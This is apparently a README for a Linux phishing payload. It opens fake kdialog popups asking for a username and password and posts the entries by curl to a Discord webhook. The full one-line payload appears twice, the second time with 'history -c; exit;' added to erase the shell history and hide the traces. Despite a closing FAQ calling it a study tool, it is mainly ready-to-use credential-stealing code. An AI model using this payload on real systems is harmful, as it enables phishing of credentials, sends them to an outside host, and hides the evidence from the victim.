 
# Standard Phishing Payload Using kdialog - Linux ✅

A script used to exfiltrate some input by a popup phishing based on linux systems using kdialog.

**Category**: Phishing

## Description

A script used to exfiltrate some input by a popup phishing based on linux systems using kdialog.

Opens a shell, get the data by a popup, send the input to a Discord webhook (or whatever you want to use for the exfiltration).

## Getting Started

### Dependencies

* Internet Connection for the Exfiltration

### Settings

* Set the Discord webhook
* Set the payload as you want

### cURL Command

With this payload you can send a post message using cURL shell command line to the webhook or whatever you choose for the exfiltration. You should replace the tag *\<message>* with the user input.

- `curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(<message>)\"}" $WEBHOOK_URL);`

### kdialog - Popup command

KDialog can be used to show nice dialog boxes from shell scripts. You can't acquire multiple input in one popup, so you should use multiple popup. You can set the title, the message, the input type and so and so on...

- Simple message popup: `kdialog --title "<replace_with_your_title>" --msgbox "<replace_with_your_message>"; `
- Plaintext input popup (i.e. Username): `kdialog --title "<input_title>" --inputbox "<input_type_title>";`
- Hiddentext input popup (i.e. Password): `kdialog --title "<input_title>" --password "<input_type_title>" --default "password";`

### The Payload

The payload will merge the cURL command with the kdialog popup output (so the user input) as the following command...

```shell
$(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; kdialog --title "Insert your Username" --inputbox "Username"; kdialog --title "Insert your Password" --password "Password" --default "password";)\"}" $WEBHOOK_URL);
```

You can put into the payload something that will clear the last shell history closing the shell at the end of the execution, adding this line `history -c; exit;`

```shell
$(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; kdialog --title "Insert your Username" --inputbox "Username"; kdialog --title "Insert your Password" --password "Password" --default "password";)\"}" $WEBHOOK_URL); history -c; exit;
```

### FAQs

- Why put the entire payload in one line?
Generally it is recommended to divide the various steps at different times by dividing each command with some DELAY, in this case it is not recommended because phishing-type cyber attacks often tend to take a long time. How can you tell how long a user should take to enter their data? What if he doesn't remember his email? It is important to consider the slow factor, which, in theory, can take really long and in any case cannot be dynamically predicted.

- Why is used the 'cyber-attack' word?
This payload is intended to be a working tool for performing cybersecurity analysis and is not intended to harm malicious users in any way. This term is used for simplicity in speaking but is really meant to be a study tool that can be worked on.

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>